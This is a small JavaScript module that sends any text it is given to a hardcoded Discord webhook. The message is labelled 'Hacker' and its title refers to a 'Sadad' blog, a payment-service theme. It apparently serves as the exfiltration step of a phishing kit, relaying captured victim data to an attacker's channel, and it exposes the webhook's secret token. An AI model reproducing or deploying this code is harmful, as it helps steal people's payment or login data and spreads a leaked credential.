import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1319315267557261344/30bQIOyy_YqW2zWZSqoQ3sY3OZFpu8GeCpmxJZys1KZQAoKfzaFvRDgSg2NdqMGqNRp6",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
